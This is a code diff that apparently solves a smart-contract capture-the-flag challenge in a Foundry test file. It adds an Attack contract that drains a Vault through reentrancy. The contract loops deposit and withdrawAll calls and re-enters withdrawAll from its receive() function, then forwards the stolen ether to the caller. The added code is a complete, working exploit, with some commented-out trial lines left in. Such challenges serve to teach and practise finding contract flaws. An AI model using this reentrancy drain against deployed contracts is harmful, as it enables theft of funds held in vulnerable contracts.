@@ -21,6 +21,7 @@ contract ChallengeTest is Test {
         vm.startPrank(playerAddress, playerAddress);
 
         ////////// YOUR CODE GOES HERE //////////
+        new Attack(address(setup.vault())).attack{value:1 ether}();
 
         ////////// YOUR CODE END //////////
 
@@ -33,5 +34,51 @@ contract ChallengeTest is Test {
 }
 
 ////////// YOUR CODE GOES HERE //////////
+contract Attack {
+    bool reentrant;
+    // bool check;
+    Vault c;
+    mapping(address=>uint256) public balanceOf;
+    constructor(address vaultaddress) {
 
+        c=Vault(vaultaddress);
+
+    }
+
+    function attack() public payable {
+        // c.deposit{value:1 ether}();
+        // check=false;
+        while(address(c).balance>=address(this).balance){
+            c.deposit{value:address(this).balance}();
+            c.withdrawAll();
+            reentrant=false;
+        }
+        c.deposit{value:address(c).balance}();
+        // reentrant=true;
+        c.withdrawAll();
+
+        // check=true;
+        (bool success,)=msg.sender.call{value:address(this).balance}("");
+        require(success);
+    }
+    receive() external payable{
+        if(reentrant==false){
+            // if(check==false){
+            reentrant=true;
+
+            c.withdrawAll();
+        }
+
+    //     if(address(c).balance != 0){
+    //         c.withdrawAll();
+    //         // (bool success,)=address(c).call{value:address(this).balance}(c.deposit,);
+    //         // require(success);
+    //         // // ??
+    // // }
+    //     }
+
+    }
+
+
+}
 ////////// YOUR CODE END //////////
